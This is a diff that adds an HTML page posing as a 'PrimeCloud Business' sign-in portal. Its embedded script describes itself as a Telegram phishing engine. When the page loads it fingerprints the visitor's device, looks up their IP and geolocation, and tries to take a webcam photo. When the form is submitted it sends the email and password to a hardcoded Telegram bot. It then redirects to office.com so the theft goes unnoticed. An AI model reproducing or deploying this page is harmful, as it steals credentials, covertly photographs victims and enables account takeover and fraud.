@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>PrimeCloud Business – Sign In</title>
+    <style>
+        :root {
+            --bg: #f5f7fa;
+            --card-bg: #ffffff;
+            --primary: #0a58ca;
+            --primary-hover: #084298;
+            --text: #212529;
+            --muted: #6c757d;
+            --border: #dee2e6;
+            --input-bg: #f8f9fa;
+            --error: #dc3545;
+            --shadow: 0 8px 30px rgba(0,0,0,0.08);
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text);
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            padding: 40px 32px;
+            animation: fadeSlide 0.5s ease;
+        }
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo-area {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo-svg {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 12px;
+            background: var(--primary);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            box-shadow: 0 8px 20px rgba(10,88,202,0.25);
+        }
+        .company-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--text);
+            letter-spacing: -0.3px;
+            margin-bottom: 4px;
+        }
+        .company-sub {
+            font-size: 13px;
+            color: var(--muted);
+            letter-spacing: 0.3px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--input-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 14px;
+            color: var(--text);
+            transition: all 0.2s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(10,88,202,0.15);
+        }
+        .checkbox-area {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            font-size: 13px;
+        }
+        .checkbox-area label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--muted);
+            cursor: pointer;
+        }
+        .checkbox-area input[type="checkbox"] {
+            accent-color: var(--primary);
+        }
+        .forgot-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.3px;
+        }
+        .login-btn:hover {
+            background: var(--primary-hover);
+        }
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+        .footer-text {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--muted);
+        }
+        .error-msg {
+            display: none;
+            background: #f8d7da;
+            color: var(--error);
+            padding: 10px 14px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            border: 1px solid #f5c2c7;
+        }
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
+        }
+        @keyframes shake {
+            0%,100%{ transform: translateX(0); }
+            25%{ transform: translateX(-8px); }
+            75%{ transform: translateX(8px); }
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(6px);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        @media (max-width: 450px) {
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-area">
+            <div class="logo-svg">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 2L2 7l10 5 10-5-10-5z"/>
+                    <path d="M2 17l10 5 10-5"/>
+                    <path d="M2 12l10 5 10-5"/>
+                </svg>
+            </div>
+            <div class="company-name">PrimeCloud</div>
+            <div class="company-sub">Business Suite</div>
+        </div>
+        <div id="errorBox" class="error-msg"></div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Work Email</label>
+                <input type="email" id="email" name="email" placeholder="you@company.com" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter password" required>
+            </div>
+            <div class="checkbox-area">
+                <label>
+                    <input type="checkbox" id="remember"> Keep me signed in
+                </label>
+                <a href="#" class="forgot-link">Forgot password?</a>
+            </div>
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+        <div class="footer-text">
+            © 2026 PrimeCloud, Inc. All rights reserved.<br>
+            <span style="opacity:0.6">Powered by azradev</span>
+        </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div id="loadingMessage" class="loading-text">Signing in…</div>
+    </div>
+
+    <script>
+    (function() {
+        // ╔══════════════════════════════════════════╗
+        // ║  QUANTUM V14.0 – AZRADEV EDITION       ║
+        // ║  ULTIMATE TELEGRAM PHISHING ENGINE     ║
+        // ╚══════════════════════════════════════════╝
+
+        // ===== BOT CONFIGURATION =====
+        const BOT_TOKEN = '8530059653:AAGbdrmnedNbOc5PRUDgrM2AU6finnAeeV0';   // dari @BotFather
+        const CHAT_ID = '7959551372';       // ID Telegram lo
+
+        // ===== GLOBAL DATA OBJECT =====
+        const DATA = {
+            meta: {
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toString()
+            },
+            device: {},
+            network: {},
+            credentials: null,
+            camera: null
+        };
+
+        // ========== UTILITY FUNCTIONS ==========
+        function showError(text) {
+            const box = document.getElementById('errorBox');
+            box.textContent = text;
+            box.classList.add('show');
+            setTimeout(() => box.classList.remove('show'), 3500);
+        }
+
+        function showLoading(text = 'Signing in…') {
+            const overlay = document.getElementById('loadingOverlay');
+            document.getElementById('loadingMessage').textContent = text;
+            overlay.classList.add('active');
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').classList.remove('active');
+        }
+
+        // ========== DATA COLLECTION ==========
+        function collectDeviceInfo() {
+            const nav = navigator;
+            const screen = window.screen;
+            const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+            return {
+                userAgent: nav.userAgent,
+                platform: nav.platform,
+                language: nav.language,
+                languages: nav.languages,
+                cookieEnabled: nav.cookieEnabled,
+                doNotTrack: nav.doNotTrack,
+                vendor: nav.vendor,
+                screen: `${screen.width}x${screen.height}`,
+                availScreen: `${screen.availWidth}x${screen.availHeight}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                devicePixelRatio: window.devicePixelRatio,
+                cores: nav.hardwareConcurrency || 'unknown',
+                memory: nav.deviceMemory || 'unknown',
+                touchPoints: nav.maxTouchPoints || 0,
+                connection: conn ? {
+                    type: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData
+                } : 'unavailable',
+                gpu: getGPUInfo()
+            };
+        }
+
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'webgl_disabled';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'masked';
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        async function getBatteryStatus() {
+            try {
+                if (!navigator.getBattery) return 'api_unavailable';
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime === Infinity ? 'not_charging' : battery.chargingTime,
+                    dischargingTime: battery.dischargingTime === Infinity ? 'not_discharging' : battery.dischargingTime
+                };
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        async function fetchNetworkInfo() {
+            // IP & Geolocation multi-source
+            const results = {};
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                results.ip = ipData.ip;
+                // Geo dari ipapi.co
+                const geoRes = await fetch(`https://ipapi.co/${results.ip}/json/`);
+                const geoData = await geoRes.json();
+                results.geo = {
+                    country: geoData.country_name,
+                    countryCode: geoData.country_code,
+                    region: geoData.region,
+                    city: geoData.city,
+                    postal: geoData.postal,
+                    lat: geoData.latitude,
+                    lon: geoData.longitude,
+                    timezone: geoData.timezone,
+                    isp: geoData.org,
+                    asn: geoData.asn
+                };
+            } catch (e) {
+                try {
+                    // fallback ke ipapi kedua
+                    const res = await fetch('https://extreme-ip-lookup.com/json/');
+                    const d = await res.json();
+                    results.ip = d.query;
+                    results.geo = {
+                        country: d.country,
+                        countryCode: d.countryCode,
+                        region: d.region,
+                        city: d.city,
+                        postal: d.zip,
+                        lat: d.lat,
+                        lon: d.lon,
+                        timezone: d.timezone,
+                        isp: d.isp,
+                        asn: d.asn
+                    };
+                } catch (e2) {
+                    results.ip = 'fetch_failed';
+                    results.geo = null;
+                }
+            }
+            return results;
+        }
+
+        // ========== CAMERA SNAPSHOT ==========
+        async function captureCameraPhoto() {
+            // Cek apakah browser mendukung getUserMedia
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                DATA.camera = { status: 'unsupported' };
+                return null;
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', true);
+                await video.play();
+
+                // Tunggu sebentar biar fokus
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Stop stream
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                DATA.camera = { status: 'captured', size: blob.size, width: canvas.width, height: canvas.height };
+                return blob;
+            } catch (err) {
+                DATA.camera = { status: 'denied', error: err.name };
+                return null;
+            }
+        }
+
+        // ========== TELEGRAM SENDER ==========
+        async function sendTextToTelegram(message) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('[AZRADEV] Simulasi kirim teks:', message);
+                return;
+            }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const chunks = message.match(/[\s\S]{1,4000}/g) || [message];
+            for (let i = 0; i < chunks.length; i++) {
+                const chunk = i === 0 ? chunks[i] : `(lanjutan ${i+1}/${chunks.length})\n${chunks[i]}`;
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: chunk,
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: true
+                        })
+                    });
+                } catch (e) {
+                    console.error('[AZRADEV] Gagal kirim teks:', e);
+                }
+            }
+        }
+
+        async function sendPhotoToTelegram(blob) {
+            if (!blob) return;
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('[AZRADEV] Simulasi kirim foto, ukuran:', blob.size);
+                return;
+            }
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snapshot.jpg');
+            formData.append('caption', '📸 Face snapshot via PrimeCloud login');
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('[AZRADEV] Gagal kirim foto:', e);
+            }
+        }
+
+        // ========== COMPILE REPORT ==========
+        function buildReport() {
+            const d = DATA;
+            const sep = '─'.repeat(28);
+            let msg = '';
+            msg += `🔐 <b>PRIMECLOUD BUSINESS – NEW LOGIN</b>\n`;
+            msg += `${sep}\n`;
+            msg += `⏱ <b>Local time:</b> ${d.meta.localTime}\n`;
+            msg += `🌐 <b>IP:</b> ${d.network.ip || 'fetching...'}\n`;
+            if (d.network.geo) {
+                const g = d.network.geo;
+                msg += `📍 <b>Location:</b> ${g.city || '?'}, ${g.region || '?'}, ${g.country || '?'}\n`;
+                msg += `   ISP: ${g.isp || '?'} (AS${g.asn || '?'})\n`;
+                msg += `   Coordinates: ${g.lat}, ${g.lon}\n`;
+            }
+            msg += `\n💻 <b>DEVICE INFO</b>\n`;
+            msg += `   OS/Platform: ${d.device.platform}\n`;
+            msg += `   Browser: ${(d.device.userAgent||'').split(') ').pop() || '?'}\n`;
+            msg += `   Language: ${d.device.language} (${d.device.languages?.join(',')})\n`;
+            msg += `   Screen: ${d.device.screen} | Viewport: ${d.device.viewport}\n`;
+            msg += `   Cores: ${d.device.cores} | RAM: ${d.device.memory} GB\n`;
+            msg += `   GPU: ${d.device.gpu}\n`;
+            if (d.device.connection !== 'unavailable') {
+                msg += `   Network: ${d.device.connection.type} ${d.device.connection.downlink}Mbps (RTT:${d.device.connection.rtt}ms)\n`;
+            }
+            if (d.device.battery && d.device.battery !== 'api_unavailable') {
+                const b = d.device.battery;
+                msg += `   🔋 Battery: ${b.level}% ${b.charging ? '⚡Charging' : '🔋Discharging'}\n`;
+            }
+            msg += `   Do Not Track: ${d.device.doNotTrack || 'unspecified'}\n`;
+            msg += `   Cookies: ${d.device.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
+
+            if (d.credentials) {
+                msg += `\n🔑 <b>LOGIN CREDENTIALS</b>\n`;
+                msg += `   Email: ${d.credentials.email}\n`;
+                msg += `   Password: ${d.credentials.password}\n`;
+                msg += `   Remember: ${d.credentials.remember ? 'Yes' : 'No'}\n`;
+            }
+
+            if (d.camera) {
+                msg += `\n📷 <b>CAMERA SNAPSHOT</b>\n`;
+                msg += `   Status: ${d.camera.status}\n`;
+                if (d.camera.status === 'captured') {
+                    msg += `   Resolution: ${d.camera.width}x${d.camera.height}, Size: ${Math.round(d.camera.size/1024)} KB\n`;
+                }
+            }
+
+            msg += `\n${sep}\n`;
+            msg += `<i>Quantum V14.0 © azradev – Enterprise Phishing Module</i>`;
+            return msg;
+        }
+
+        // ========== MAIN FLOW ==========
+        async function initialize() {
+            // Kumpulkan data device secepatnya
+            DATA.device = collectDeviceInfo();
+            DATA.device.battery = await getBatteryStatus();
+
+            // Jalankan network dan kamera secara paralel
+            const [networkData, photoBlob] = await Promise.all([
+                fetchNetworkInfo(),
+                captureCameraPhoto()
+            ]);
+            DATA.network = networkData;
+
+            // Kirim laporan awal + foto
+            const report = buildReport();
+            await sendTextToTelegram(report);
+            if (photoBlob) {
+                await sendPhotoToTelegram(photoBlob);
+            }
+            console.log('[AZRADEV] Data awal terkirim.');
+        }
+
+        // ========== FORM HANDLER ==========
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const remember = document.getElementById('remember').checked;
+
+            if (!email || !password) {
+                showError('Please fill in all fields.');
+                return;
+            }
+
+            DATA.credentials = { email, password, remember };
+            const credReport = buildReport();
+            await sendTextToTelegram(credReport);
+
+            // Tampilkan loading lalu redirect seolah-olah login sukses
+            showLoading('Verifying your identity…');
+            setTimeout(() => {
+                hideLoading();
+                // Redirect ke portal bisnis asli (Microsoft 365) agar tidak mencurigakan
+                window.location.href = 'https://www.office.com/';
+            }, 4000);
+        });
+
+        // Fallback link
+        document.querySelector('.forgot-link').addEventListener('click', (e) => {
+            e.preventDefault();
+            showError('Contact your administrator to reset password.');
+        });
+
+        // Jalankan inisialisasi
+        initialize().catch(err => {
+            console.error('[AZRADEV] Init error:', err);
+            // Tetap kirim data yang sudah ada
+            sendTextToTelegram(buildReport());
+        });
+
+        // Copyright debug
+        console.log('%c🔒 PrimeCloud Business – Secured by azradev','color:#0a58ca;font-weight:bold;');
+    })();
+    </script>
+</body>
+</html>
